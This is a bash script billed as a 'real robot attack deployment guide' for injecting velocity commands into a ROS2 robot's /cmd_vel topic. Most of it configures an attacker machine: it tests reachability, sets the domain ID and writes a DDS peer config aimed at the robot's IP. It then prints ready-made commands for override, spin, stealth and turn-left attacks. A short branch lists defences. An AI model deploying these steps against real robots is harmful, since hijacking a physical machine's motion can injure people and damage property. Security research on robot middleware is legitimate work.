#!/bin/bash
# Real robot attack deployment guide script

echo "=========================================="
echo "Real Robot /cmd_vel Injection Attack Deployment Guide"
echo "=========================================="
echo ""

# Check which machine we're on
echo "Please confirm which machine you are on:"
echo "1) Attacker machine (will run attack script)"
echo "2) Robot machine (target)"
read -p "Enter option [1/2]: " machine_type

if [ "$machine_type" = "1" ]; then
    echo ""
    echo "=== Attacker Machine Configuration ==="
    echo ""
    
    # Check ROS2 installation
    if [ -z "$ROS_DISTRO" ]; then
        echo "Warning: ROS2 environment not loaded"
        echo "Please install and configure ROS2 first:"
        echo "  Ubuntu 22.04: sudo apt install ros-humble-desktop"
        echo "  Ubuntu 24.04: sudo apt install ros-jazzy-desktop"
        echo ""
        read -p "Is ROS2 installed? [y/N]: " has_ros2
        if [ "$has_ros2" != "y" ]; then
            echo "Please install ROS2 first, then run this script again"
            exit 1
        fi
    else
        echo "ROS2 environment: $ROS_DISTRO"
    fi
    
    # Get robot IP
    echo ""
    read -p "Enter robot machine IP address: " robot_ip
    
    # Test network connection
    echo ""
    echo "Testing network connection..."
    if ping -c 2 "$robot_ip" &> /dev/null; then
        echo "Network connection OK"
    else
        echo "Cannot connect to robot ($robot_ip)"
        echo "Please check:"
        echo "  1. Robot is on the same network"
        echo "  2. IP address is correct"
        echo "  3. Firewall settings"
        exit 1
    fi
    
    # Configure ROS_DOMAIN_ID
    echo ""
    read -p "Enter ROS_DOMAIN_ID (default 0, enter 0 if robot uses default): " domain_id
    domain_id=${domain_id:-0}
    export ROS_DOMAIN_ID=$domain_id
    echo "ROS_DOMAIN_ID set to: $domain_id"
    
    # Check DDS configuration requirements
    echo ""
    echo "Checking network configuration..."
    current_network=$(ip route | grep default | awk '{print $5}' | head -1)
    robot_network=$(echo "$robot_ip" | cut -d'.' -f1-3)
    current_network_prefix=$(ip addr show $current_network 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d'.' -f1-3)
    
    if [ "$current_network_prefix" = "$robot_network" ]; then
        echo "On same subnet, can use default DDS config (multicast)"
        use_dds_config=false
    else
        echo "Not on same subnet, need to configure DDS routing"
        use_dds_config=true
    fi
    
    # Create DDS config file (if needed)
    if [ "$use_dds_config" = "true" ]; then
        echo ""
        echo "Creating DDS routing configuration..."
        cat > ~/dds_attack_config.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<CycloneDDS>
  <Domain>
    <Id>$domain_id</Id>
    <General>
      <NetworkInterfaceAddress>auto</NetworkInterfaceAddress>
      <AllowMulticast>false</AllowMulticast>
    </General>
    <Discovery>
      <ParticipantIndex>auto</ParticipantIndex>
      <Peers>
        <Peer Address="$robot_ip"/>
      </Peers>
    </Discovery>
  </Domain>
</CycloneDDS>
EOF
        export CYCLONEDDS_URI=file://$HOME/dds_attack_config.xml
        echo "DDS config created: ~/dds_attack_config.xml"
        echo "Environment variable set: CYCLONEDDS_URI=$CYCLONEDDS_URI"
    fi
    
    # Restart ROS2 daemon
    echo ""
    echo "Restarting ROS2 daemon..."
    ros2 daemon stop
    sleep 1
    ros2 daemon start
    sleep 2
    
    # Test discovery
    echo ""
    echo "Testing node discovery..."
    echo "Waiting 5 seconds for DDS to discover nodes..."
    sleep 5
    
    nodes=$(ros2 node list 2>/dev/null)
    topics=$(ros2 topic list 2>/dev/null)
    
    if [ -n "$nodes" ]; then
        echo "Nodes discovered:"
        echo "$nodes" | head -5
    else
        echo "No nodes discovered (may be normal if robot is not running)"
    fi
    
    if echo "$topics" | grep -q cmd_vel; then
        echo "/cmd_vel topic discovered"
    else
        echo "/cmd_vel topic not discovered"
        echo "Please ensure robot is running and publishing /cmd_vel"
    fi
    
    # Generate attack commands
    echo ""
    echo "=========================================="
    echo "Configuration complete! Use these commands to attack:"
    echo "=========================================="
    echo ""
    echo "# Basic attack command"
    echo "python3 injection_attack.py --attack-type override --frequency 50 --duration 10"
    echo ""
    echo "# Spin attack"
    echo "python3 injection_attack.py --attack-type spin --angular-speed 2.0 --duration 5"
    echo ""
    echo "# Stealth attack"
    echo "python3 injection_attack.py --attack-type stealth --frequency 25 --duration 30"
    echo ""
    echo "# Turn left attack"
    echo "python3 injection_attack.py --attack-type turn_left --frequency 50 --duration 15"
    echo ""
    
    if [ "$use_dds_config" = "true" ]; then
        echo "Note: Set DDS config before each attack:"
        echo "export CYCLONEDDS_URI=file://$HOME/dds_attack_config.xml"
        echo ""
    fi
    
elif [ "$machine_type" = "2" ]; then
    echo ""
    echo "=== Robot Machine Configuration (Defense Preparation) ==="
    echo ""
    echo "Here are some defense recommendations:"
    echo ""
    echo "1. Use non-default ROS_DOMAIN_ID:"
    echo "   export ROS_DOMAIN_ID=42  # Use random number"
    echo ""
    echo "2. Configure firewall (restrict DDS ports):"
    echo "   sudo ufw deny 7400:7500/udp"
    echo ""
    echo "3. Monitor /cmd_vel publishers:"
    echo "   ros2 topic info /cmd_vel"
    echo "   ros2 node info <node_name>"
    echo ""
    echo "4. Use SROS2 for secure communication (advanced)"
    echo ""
    echo "5. Network isolation: Use dedicated network or VPN"
    echo ""
else
    echo "Invalid option"
    exit 1
fi

echo "=========================================="

